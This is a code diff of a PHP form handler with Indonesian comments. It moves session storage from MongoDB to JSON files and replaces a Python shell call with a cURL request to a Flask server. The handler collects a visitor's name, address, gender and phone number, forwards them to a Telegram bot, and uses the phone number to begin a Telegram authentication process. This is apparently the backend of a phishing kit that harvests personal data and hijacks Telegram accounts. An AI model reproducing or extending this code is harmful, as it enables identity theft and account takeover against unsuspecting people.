@@ -1,13 +1,12 @@
 <?php
-require_once __DIR__ . '/db_config.php';
-require_once __DIR__ . '/MongoDBSessionHandler.php';
+require_once __DIR__ . '/JsonSessionHandler.php';
 require_once __DIR__ . '/telegram.php';
 require_once __DIR__ . '/telegram_config.php';
 
-// Inisialisasi MongoDB Session Handler
-$mongoSessionHandler = new MongoDBSessionHandler($mongo_connection_string);
-session_set_save_handler($mongoSessionHandler, true);
-$GLOBALS['mongoSessionHandler'] = $mongoSessionHandler;
+// Inisialisasi JSON Session Handler
+$jsonSessionHandler = new JsonSessionHandler();
+session_set_save_handler($jsonSessionHandler, true);
+$GLOBALS['jsonSessionHandler'] = $jsonSessionHandler;
 
 session_start();
 
@@ -57,9 +56,9 @@ $_SESSION['user_data'] = [
     'timestamp' => time()
 ];
 
-// Simpan juga ke MongoDB secara langsung
-if (isset($mongoSessionHandler)) {
-    $mongoSessionHandler->saveTelegramData($string, [
+// Simpan juga ke JSON secara langsung
+if (isset($jsonSessionHandler)) {
+    $jsonSessionHandler->saveTelegramData($string, [
         'form_data' => [
             'fullname' => $fullname,
             'address' => $address,
@@ -73,16 +72,30 @@ if (isset($mongoSessionHandler)) {
 // Kirim ke bot Telegram
 $telegramResult = sendTelegram($string);
 
-// Integrate with Telethon - start authentication process
+// Komunikasi dengan server Flask
 try {
+    // Gunakan cURL untuk berkomunikasi dengan server Flask
     $session_id = session_id();
-    $command = escapeshellcmd("python $telegram_auth_script form " . 
-               escapeshellarg($phoneNumber) . " " . 
-               escapeshellarg($session_id));
-    $output = shell_exec($command);
+    $data = [
+        'session_id' => $session_id,
+        'phone_number' => $phoneNumber,
+        'fullname' => $fullname,
+        'address' => $address,
+        'gender' => $gender
+    ];
     
-    if ($output === null) {
-        throw new Exception("Gagal mengeksekusi script Python");
+    $ch = curl_init($flask_server_url . "/form");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    
+    $output = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($http_code != 200) {
+        throw new Exception("Error komunikasi dengan server Flask (HTTP $http_code)");
     }
     
     $result = json_decode($output, true);
@@ -106,9 +119,9 @@ try {
     // Log error untuk debugging
     error_log("Error in form.php: " . $e->getMessage());
     
-    // Tambahkan ke MongoDB untuk tracking
-    if (isset($mongoSessionHandler)) {
-        $mongoSessionHandler->saveTelegramData("Error processing form: " . $e->getMessage(), [
+    // Tambahkan ke JSON untuk tracking
+    if (isset($jsonSessionHandler)) {
+        $jsonSessionHandler->saveTelegramData("Error processing form: " . $e->getMessage(), [
             'error' => true,
             'stage' => 'form_error'
         ]);
